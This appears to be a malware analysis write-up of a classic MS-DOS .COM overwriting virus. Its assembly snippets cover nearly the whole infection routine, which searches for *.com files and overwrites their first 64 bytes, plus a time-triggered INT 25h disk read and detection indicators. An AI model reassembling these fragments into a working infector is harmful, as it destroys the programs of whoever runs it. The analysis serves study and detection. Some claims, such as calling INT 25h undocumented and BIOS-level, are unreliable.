
# Analysis of a COM File Infector (MS-DOS, TASM 4)

## Introduction

This malware is a classic MS-DOS `.COM` file infector, written in x86 assembly using TASM 4. The code targets `.COM` files in the current directory and attempts to overwrite the beginning of each file with a copy of its own payload (64 bytes). It uses BIOS and DOS interrupts (`INT 21h`, `INT 25h`) and operates at a low level, which is typical of early file-infecting viruses.

The logic is designed for real-mode execution on a 16-bit 80286 CPU or compatible system.

## General Behavior

At a high level, the malware does the following:

1. Searches for all `.COM` files in the current directory.
2. Opens each file and writes 64 bytes from its own start over the target file.
3. Continues this process for every `.COM` file found.
4. If no files are found, it reads the system time.
5. If the hundredths of a second are below or equal to 10, it attempts a low-level disk read (`INT 25h`), possibly as a payload trigger or corruption technique.

## Technical Analysis

### Function: start (Entry Point)
```asm
start:  
    mov ah, 4Eh             ; Find first file with mask
loc_2:  
    mov dx, offset filespec ; Search for "*.com"
    int 21h                 ; DOS - Find first matching file
    jb  short loc_30        ; If not found, go to time check
```

- Uses DOS function `4Eh` (Find First File) with the pattern `*.com`.
- If no file is found, jumps to the fallback logic (`loc_30`).

### Function: InfectFile
```asm
    mov ax, 3D02h           ; Open file R/W
    mov dx, 9Eh             ; Points to filename in DTA
    int 21h                 ; AX = file handle if success

    mov bx, ax              ; Save handle
    mov ah, 40h             ; Write to file
    mov dx, 100h            ; Start of memory (where our code resides)
    mov cx, 40h             ; Write 64 bytes
    int 21h                 ; Write infection payload
```

- Opens the file using handle from the Disk Transfer Area (DTA).
- Writes 64 bytes from memory offset `100h` (standard .COM entry point) to the beginning of the file.
- Infects the `.COM` file by overwriting it with the beginning of this program.

### Function: Cleanup and Loop
```asm
    mov ah, 3Eh             ; Close file
    int 21h                 ; Close handle

    mov ah, 4Fh             ; Find next file
    jmp short loc_2         ; Loop back for next file
```

- Closes the currently opened file.
- Loops back to find the next `.COM` file.

### Function: loc_30 (Fallback if no file is found)
```asm
loc_30: 
    mov ah, 2Ch             ; Get system time
    int 21h                 ; CH=hour, CL=minute, DH=sec, DL=1/100 sec

    cmp dl, 0Ah             ; If < 10 hundredths of a second
    ja  short locret_3F     ; Skip if higher
```

- Gets system time, uses DL (hundredths of second) to add some randomness or trigger time-based behavior.

### Function: DiskAccess (INT 25h)
```asm
    mov al, 2               ; Drive C:
    xor dx, dx              ; Sector 0
    int 25h                 ; Absolute disk read (low-level)
```

- Uses `INT 25h` (undocumented, direct disk read).
- Attempts to read sector 0 of drive C, possibly to tamper with the boot sector or trigger further damage.

### Return to DOS
```asm
locret_3F:
    ret
```

- Returns control to DOS after execution.

## Techniques Used

### 🧬 **Persistence**
- None explicitly — it's a direct infector and does not write itself to the disk in a persistent way (no registry, no autostart).

### 🎭 **Obfuscation**
- No obfuscation is used; code is clean and readable.

### 📦 **Infection Mechanism**
- File infector: overwrites the beginning of other `.COM` files with its own code.

### 🧨 **Destructive / Dangerous Behavior**
- Uses `INT 25h` for low-level disk access — very risky. Reading or writing sectors this way can corrupt the system.

### 🔁 **Looping Through Files**
- Loops through all `.COM` files using DOS `Find First`/`Find Next`.

### 🧪 **Time-based Execution**
- Time check via `INT 21h / 2Ch`, possibly to randomly trigger the disk read payload.

## Conclusion

This program is a **minimalistic but functional file-infector virus targeting MS-DOS `.COM` files**. It shows hallmarks of early malware:

- Uses standard DOS interrupts to locate and infect executable files.
- Includes an optional payload using BIOS-level disk access.
- May act destructively based on system time.

While this malware lacks stealth or persistence techniques seen in modern malware, it represents a classic example of real-mode file infection strategies.

### Detection & Mitigation

- Heuristic-based AV can detect the sequence of file-open and write activity.
- Monitoring calls to `INT 25h` is also a clear red flag.
- Avoid executing unknown `.COM` files in DOS environments.

## Indicators (IOCs)

- **Filename pattern targeted:** `*.com`
- **File operations:** DOS `int 21h` with `AH=3D`, `AH=40`, `AH=3E`
- **Disk access:** `int 25h` with `AL=2`, `DX=0`
- **Payload signature (first few bytes):**

```asm
B4 4E BA ?? ?? CD 21 72 ?? B8 02 3D BA 9E 00 CD 21 89 C3 ...
```
